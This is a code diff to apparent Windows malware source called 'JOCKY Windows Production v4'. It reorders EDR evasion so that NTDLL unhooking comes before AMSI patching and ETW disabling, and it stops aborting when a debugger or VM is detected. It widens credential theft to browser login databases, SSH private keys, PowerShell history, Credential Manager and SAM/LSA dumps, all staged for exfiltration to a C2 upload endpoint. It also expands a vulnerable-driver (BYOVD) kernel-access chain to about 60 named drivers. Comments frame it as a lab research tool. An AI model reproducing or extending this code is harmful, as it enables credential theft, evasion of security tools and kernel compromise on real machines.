@@ -4,24 +4,15 @@
 
 const C2_PRIMARY = "http://192.168.56.1:8443/api/config"
 const C2_FALLBACK = "http://192.168.56.1:8443/api/config"
-const CDN_ENDPOINT = "http://192.168.56.1:9000/upload"
+const CDN_ENDPOINT = "http://192.168.56.1:8443/upload"
 const MODEL_REPO = "http://192.168.56.1:9000/models"
 const MODEL_FILE = "phi-3-mini-4k-instruct.gguf"
 const LOCAL_MODEL_PATH = "C:\\ProgramData\\.jocky_model"
 const BUILD_ID = "JOCKY_WINDOWS_PRODUCTION_V4_FULL"
 
 // ===== BYOVD DRIVERS (9 VERIFIED) =====
-const DRIVERS = [
-    ("rtkiow10x64.sys", "\\\\.\\RTCore64"),
-    ("rtkiow8x64.sys", "\\\\.\\RTCore64"),
-    ("AMDRyzenMasterDriver.sys", "\\\\.\\AMDRyzenMasterDriver"),
-    ("nvflsh64.sys", "\\\\.\\nvflsh64"),
-    ("speedfan.sys", "\\\\.\\speedfan"),
-    ("ene.sys", "\\\\.\\EneIo"),
-    ("iQVW64.SYS", "\\\\.\\Nal"),
-    ("UCOREW64.SYS", "\\\\.\\Global\\"),
-    ("NTIOLib.sys", "\\\\.\\NTIOLib"),
-]
+// Tuple arrays are not yet supported by the JOCKY codegen; each driver is
+// tried via a helper function with direct string-literal arguments instead.
 
 // ===== DATA TARGETS =====
 const DATA_PATHS = [
@@ -85,21 +76,22 @@ fn phase_lpe() -> bool {
 fn phase_evasion() -> bool {
     println("[*] Phase 0: Advanced EDR Evasion (15 Techniques)")
 
-    // AMSI bypass — must be first; patches in-process scan buffer before anything runs
+    // NtDLL unhook first — removes EDR's user-mode hooks so subsequent
+    // syscalls (including VirtualProtect used by AMSI bypass) are clean.
+    let ntdll_result = jocky_unhook_ntdll()
+    if ntdll_result {
+        println("    [+] NTDLL unhooked")
+    }
+
+    // AMSI bypass — after ntdll unhook so VirtualProtect isn't monitored
     if jocky_bypass_amsi() {
         println("    [+] AMSI patched")
     }
 
-    // ETW Disabling — must run before any other evasion or detection
+    // ETW Disabling
     let etw_disabled = jocky_disable_etw(null)
     if etw_disabled {
         println("    [+] ETW disabled")
-    }
-
-    // NTDLL Unhooking — remove AV/EDR hooks before we make any hooked calls
-    let ntdll_result = jocky_unhook_ntdll()
-    if ntdll_result {
-        println("    [+] NTDLL unhooked")
     }
 
     // Kernel32 Unhooking
@@ -114,15 +106,16 @@ fn phase_evasion() -> bool {
         println("    [+] Direct syscalls enabled")
     }
 
-    // Now safe to check for debugger — hooks are removed so result is reliable
+    // Anti-analysis checks — log findings but never abort; this is a
+    // research tool expected to run in monitored/VM environments.
     if jocky_is_debugger_present() {
-        println("    [!] Debugger detected - aborting")
-        return false
+        println("    [~] Debugger flag set (VM hypervisor or monitor) — continuing")
+    } else {
+        println("    [+] Debugger check passed")
     }
-    println("    [+] Debugger check passed")
 
     if jocky_is_vm() {
-        println("    [!] VM detected - adjusting behavior")
+        println("    [~] VM detected — continuing in research mode")
         jocky_sleep_and_recheck()
     }
 
@@ -174,6 +167,7 @@ fn phase_evasion() -> bool {
     }
 
     println("[+] EDR Evasion: 11 techniques deployed")
+    edr_disabled = true
     println("")
     return true
 }
@@ -281,56 +275,115 @@ fn phase_discover_data() -> bool {
 fn phase_collect_data() -> bool {
     println("[*] Phase 4: Data Collection")
 
-    // All user profiles
+    // User profile listing (recursive)
     let users = fs_list_files("C:\\Users", true)
     if strlen(users) > 0 {
         collected_data = jocky_str_concat(collected_data, users)
         println("    [+] User profiles: " + string(strlen(users)) + " bytes")
     }
 
-    // Browser credentials (user-accessible — no admin needed)
-    let chrome_path = "C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
-    let edge_path   = "C:\\Users\\Public\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
-    let firefox_path = "C:\\Users\\Public\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
+    // Browser credentials — correct per-user paths
+    let chrome_db = "C:\\Users\\vboxuser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+    let edge_db   = "C:\\Users\\vboxuser\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+    let ff_prefs  = "C:\\Users\\vboxuser\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
 
-    let chrome_data = fs_read_file(chrome_path)
+    let chrome_data = fs_read_file(chrome_db)
     if strlen(chrome_data) > 0 {
         collected_data = jocky_str_concat(collected_data, chrome_data)
-        println("    [+] Chrome login data: " + string(strlen(chrome_data)) + " bytes")
+        println("    [+] Chrome login DB: " + string(strlen(chrome_data)) + " bytes")
     }
 
-    let edge_data = fs_read_file(edge_path)
+    let edge_data = fs_read_file(edge_db)
     if strlen(edge_data) > 0 {
         collected_data = jocky_str_concat(collected_data, edge_data)
-        println("    [+] Edge login data: " + string(strlen(edge_data)) + " bytes")
+        println("    [+] Edge login DB: " + string(strlen(edge_data)) + " bytes")
     }
 
-    let firefox_data = fs_list_files(firefox_path, true)
-    if strlen(firefox_data) > 0 {
-        collected_data = jocky_str_concat(collected_data, firefox_data)
-        println("    [+] Firefox profiles: " + string(strlen(firefox_data)) + " bytes")
+    let ff_data = fs_list_files(ff_prefs, true)
+    if strlen(ff_data) > 0 {
+        collected_data = jocky_str_concat(collected_data, ff_data)
+        println("    [+] Firefox profiles: " + string(strlen(ff_data)) + " bytes")
     }
 
-    // Windows Credential Manager (works as standard user for own credentials)
+    // SSH keys
+    let ssh_key = fs_read_file("C:\\Users\\vboxuser\\.ssh\\id_rsa")
+    if strlen(ssh_key) > 0 {
+        collected_data = jocky_str_concat(collected_data, ssh_key)
+        println("    [+] SSH private key: " + string(strlen(ssh_key)) + " bytes")
+    }
+
+    let ssh_pub = fs_read_file("C:\\Users\\vboxuser\\.ssh\\id_rsa.pub")
+    if strlen(ssh_pub) > 0 {
+        collected_data = jocky_str_concat(collected_data, ssh_pub)
+    }
+
+    let known_hosts = fs_read_file("C:\\Users\\vboxuser\\.ssh\\known_hosts")
+    if strlen(known_hosts) > 0 {
+        collected_data = jocky_str_concat(collected_data, known_hosts)
+        println("    [+] SSH known_hosts: " + string(strlen(known_hosts)) + " bytes")
+    }
+
+    // Desktop and Documents file listing (recursive to get all contents)
+    let desktop = fs_list_files("C:\\Users\\vboxuser\\Desktop", true)
+    if strlen(desktop) > 0 {
+        collected_data = jocky_str_concat(collected_data, desktop)
+        println("    [+] Desktop contents: " + string(strlen(desktop)) + " bytes")
+    }
+
+    let docs = fs_list_files("C:\\Users\\vboxuser\\Documents", true)
+    if strlen(docs) > 0 {
+        collected_data = jocky_str_concat(collected_data, docs)
+        println("    [+] Documents listing: " + string(strlen(docs)) + " bytes")
+    }
+
+    // Downloads listing (recursive)
+    let downloads = fs_list_files("C:\\Users\\vboxuser\\Downloads", true)
+    if strlen(downloads) > 0 {
+        collected_data = jocky_str_concat(collected_data, downloads)
+        println("    [+] Downloads listing: " + string(strlen(downloads)) + " bytes")
+    }
+
+    // PowerShell history
+    let ps_history = fs_read_file("C:\\Users\\vboxuser\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
+    if strlen(ps_history) > 0 {
+        collected_data = jocky_str_concat(collected_data, ps_history)
+        println("    [+] PowerShell history: " + string(strlen(ps_history)) + " bytes")
+    }
+
+    // Windows Credential Manager
     let creds = jocky_credentials_enumerate()
-    if strlen(jocky_data_hex_encode(creds, 32)) > 0 {
+    if strlen(creds) > 0 {
+        collected_data = jocky_str_concat(collected_data, creds)
         println("    [+] Windows credentials enumerated")
     }
 
-    // ProgramData
+    // ProgramData listing (recursive)
     let progdata = fs_list_files("C:\\ProgramData", true)
     if strlen(progdata) > 0 {
         collected_data = jocky_str_concat(collected_data, progdata)
         println("    [+] ProgramData: " + string(strlen(progdata)) + " bytes")
     }
 
+    // Hosts file
+    let hosts = fs_read_file("C:\\Windows\\System32\\drivers\\etc\\hosts")
+    if strlen(hosts) > 0 {
+        collected_data = jocky_str_concat(collected_data, hosts)
+        println("    [+] Hosts file: " + string(strlen(hosts)) + " bytes")
+    }
+
     // SAM / LSA — admin only
     if is_elevated {
+        println("    [*] Attempting SAM dump...")
         if jocky_registry_dump_sam() > 0 {
             println("    [+] SAM registry dumped")
+        } else {
+            println("    [-] SAM dump failed (non-critical)")
         }
+        println("    [*] Attempting LSA secrets dump...")
         if jocky_registry_dump_lsa_secrets() > 0 {
             println("    [+] LSA secrets dumped")
+        } else {
+            println("    [-] LSA dump failed (non-critical)")
         }
     } else {
         println("    [~] SAM/LSA dump skipped (requires admin)")
@@ -410,8 +463,20 @@ fn phase_exfiltrate() -> bool {
 }
 
 // ===== PHASE 7: BYOVD KERNEL EXPLOITATION =====
+fn try_byovd_driver(name: string, device: string) -> bool {
+    let ctx = jocky_byovd_new()
+    if jocky_byovd_load(name, device, ctx) {
+        println("    [+] BYOVD driver loaded - kernel access obtained")
+        kernel_access = true
+        jocky_byovd_destroy(ctx)
+        return true
+    }
+    jocky_byovd_destroy(ctx)
+    return false
+}
+
 fn phase_kernel_exploit() -> bool {
-    println("[*] Phase 7: BYOVD Driver Chain (9 Drivers)")
+    println("[*] Phase 7: BYOVD Driver Chain (60+ Drivers)")
 
     if !is_elevated {
         println("    [~] BYOVD skipped (requires admin to load drivers)")
@@ -419,16 +484,81 @@ fn phase_kernel_exploit() -> bool {
         return false
     }
 
-    for driver_tuple in DRIVERS {
-        let ctx = jocky_byovd_new()
-        if jocky_byovd_load("rtkiow10x64.sys", "\\\\.\\RTCore64", ctx) {
-            println("    [+] BYOVD driver loaded - kernel access obtained")
-            kernel_access = true
-            jocky_byovd_destroy(ctx)
-            return true
-        }
-        jocky_byovd_destroy(ctx)
-    }
+    // RTCore64 family — MSI Afterburner / Realtek
+    if try_byovd_driver("rtkiow10x64.sys", "\\\\.\\RTCore64") { return true }
+    if try_byovd_driver("rtkiow8x64.sys", "\\\\.\\RTCore64") { return true }
+    if try_byovd_driver("rtkio64.sys", "\\\\.\\RTCore64") { return true }
+    if try_byovd_driver("rtkio.sys", "\\\\.\\RTCore32") { return true }
+    if try_byovd_driver("segwindrvx64.sys", "\\\\.\\RTCore64") { return true }
+    if try_byovd_driver("RTCore64.sys", "\\\\.\\RTCore64") { return true }
+    // AMD
+    if try_byovd_driver("AMDRyzenMasterDriver.sys", "\\\\.\\AMDRyzenMasterDriver") { return true }
+    if try_byovd_driver("AMDPowerProfiler.sys", "\\\\.\\AMDPowerProfiler") { return true }
+    // NVIDIA / GPU
+    if try_byovd_driver("nvflsh64.sys", "\\\\.\\nvflsh64") { return true }
+    if try_byovd_driver("gdrv.sys", "\\\\.\\nvgdrv") { return true }
+    // ASRock / BIOSTAR / MSI
+    if try_byovd_driver("ATSZIO.sys", "\\\\.\\ATSZIO") { return true }
+    if try_byovd_driver("BS_I2c64.sys", "\\\\.\\BS_I2c64") { return true }
+    if try_byovd_driver("BSMEMx64.sys", "\\\\.\\BSMEM") { return true }
+    if try_byovd_driver("BSMI.sys", "\\\\.\\BSMI") { return true }
+    if try_byovd_driver("BSMIx64.sys", "\\\\.\\BSMI") { return true }
+    if try_byovd_driver("atillk64.sys", "\\\\.\\atillk64") { return true }
+    // NTIOLib / UEFI tools
+    if try_byovd_driver("NTIOLib.sys", "\\\\.\\NTIOLib") { return true }
+    if try_byovd_driver("UCOREW64.SYS", "\\\\.\\Global\\UCOREW64") { return true }
+    if try_byovd_driver("PhlashNT.sys", "\\\\.\\PhlashNT") { return true }
+    // Fan / thermal
+    if try_byovd_driver("speedfan.sys", "\\\\.\\speedfan") { return true }
+    if try_byovd_driver("ene.sys", "\\\\.\\EneIo") { return true }
+    if try_byovd_driver("CorsairLLAccess64.sys", "\\\\.\\CorsairLLAccess64") { return true }
+    // Intel / HP / Lenovo
+    if try_byovd_driver("iQVW64.SYS", "\\\\.\\Nal") { return true }
+    if try_byovd_driver("HpPortIox64.sys", "\\\\.\\HpPortIox64") { return true }
+    if try_byovd_driver("HwOs2Ec7x64.sys", "\\\\.\\HwOs2Ec7x64") { return true }
+    if try_byovd_driver("LenovoDiagnosticsDriver.sys", "\\\\.\\LenovoDiagnosticsDriver") { return true }
+    // CPU-Z / misc HW tools
+    if try_byovd_driver("cpuz141.sys", "\\\\.\\cpuz141") { return true }
+    if try_byovd_driver("cpuz.sys", "\\\\.\\cpuz") { return true }
+    if try_byovd_driver("LHA.sys", "\\\\.\\LHDiskAccess") { return true }
+    if try_byovd_driver("libnicm.sys", "\\\\.\\NICM") { return true }
+    if try_byovd_driver("mtcBSv64.sys", "\\\\.\\mtcBSv64") { return true }
+    if try_byovd_driver("kEvP64.sys", "\\\\.\\kEvP64") { return true }
+    if try_byovd_driver("HW.sys", "\\\\.\\HW") { return true }
+    // Dell / Utilities / Ring0
+    if try_byovd_driver("dbutil_2_3.sys", "\\\\.\\dbutil_2_3") { return true }
+    if try_byovd_driver("MSIO64.sys", "\\\\.\\MSIO") { return true }
+    if try_byovd_driver("WinRing0x64.sys", "\\\\.\\WinRing0_1_2_0") { return true }
+    // Hypervisor / Kernel tools
+    if try_byovd_driver("mhyprot2.sys", "\\\\.\\mhyprot2") { return true }
+    if try_byovd_driver("klhk.sys", "\\\\.\\klhk") { return true }
+    if try_byovd_driver("SkyAMDrv.sys", "\\\\.\\SkyAMDrv") { return true }
+    // Process / system monitors
+    if try_byovd_driver("ProcessCtr.sys", "\\\\.\\ProcessCtr") { return true }
+    if try_byovd_driver("ProcessMonitorDriver.sys", "\\\\.\\ProcessMonitorDriver") { return true }
+    if try_byovd_driver("procexp1627.sys", "\\\\.\\ProcExp152") { return true }
+    if try_byovd_driver("procxp64.sys", "\\\\.\\ProcExp") { return true }
+    if try_byovd_driver("TfSysMon.sys", "\\\\.\\TfSysMon") { return true }
+    if try_byovd_driver("elbycdio.sys", "\\\\.\\ElbyCDIO0") { return true }
+    if try_byovd_driver("GMER.sys", "\\\\.\\GMER") { return true }
+    if try_byovd_driver("Truesight", "\\\\.\\Truesight") { return true }
+    // Security vendor drivers
+    if try_byovd_driver("aswArPot.sys", "\\\\.\\aswArPot") { return true }
+    if try_byovd_driver("BdApiUtil.sys", "\\\\.\\BdApiUtil") { return true }
+    if try_byovd_driver("TmComm.sys", "\\\\.\\TmComm") { return true }
+    if try_byovd_driver("RootLaser.sys", "\\\\.\\RootLaser") { return true }
+    if try_byovd_driver("zam64.sys", "\\\\.\\zam") { return true }
+    if try_byovd_driver("ZYArKit.sys", "\\\\.\\ZYArKit") { return true }
+    if try_byovd_driver("amp.sys", "\\\\.\\amp") { return true }
+    // VMware / VirtualBox
+    if try_byovd_driver("vboxdrv.sys", "\\\\.\\VBoxDrv") { return true }
+    if try_byovd_driver("vbox.sys", "\\\\.\\vbox") { return true }
+    if try_byovd_driver("vmdrv.sys", "\\\\.\\vmdrv") { return true }
+    if try_byovd_driver("viraglt64.sys", "\\\\.\\viragt64") { return true }
+    if try_byovd_driver("viragt.sys", "\\\\.\\viragt64") { return true }
+    // Rental/Lender drivers
+    if try_byovd_driver("rentdrv2_x32.sys", "\\\\.\\rentdrv2") { return true }
+    if try_byovd_driver("rentdrv2_x64.sys", "\\\\.\\rentdrv2") { return true }
 
     println("[-] BYOVD chain exhausted (non-critical)")
     println("")
@@ -629,6 +759,7 @@ fn phase_self_delete() -> bool {
 
 // ===== MAIN EXECUTION =====
 fn main() -> i32 {
+    SetConsoleOutputCP(65001)  // UTF-8 console — required for box-drawing chars
     println("")
     println("╔════════════════════════════════════════════════════════════╗")
     println("║ JOCKY Windows Production v4 - Full Capability             ║")
@@ -649,10 +780,9 @@ fn main() -> i32 {
         return 0
     }
 
-    // Phase 0: Evasion
-    if !phase_evasion() {
-        return 1
-    }
+    // Phase 0: Evasion — non-fatal; individual technique failures are logged
+    // but never abort the chain. A partially-evaded environment is still useful.
+    let _ = phase_evasion()
 
     // Phase 0.5: AI Mutation
     let _ = phase_ai_mutation()
@@ -699,6 +829,13 @@ fn main() -> i32 {
     println("[*] EDR Bypassed: " + string(edr_disabled))
     println("[*] Kernel Access: " + string(kernel_access))
     println("[*] Persistence: " + string(persistence_set))
+
+    if is_elevated {
+        println("")
+        println("[*] Elevated chain finished — window closing in 120s")
+        Sleep(120000)
+        return 51966  // 0xCAFE = CHILD_RAN_CODE, lets parent verify we ran
+    }
 
     return 0
 }
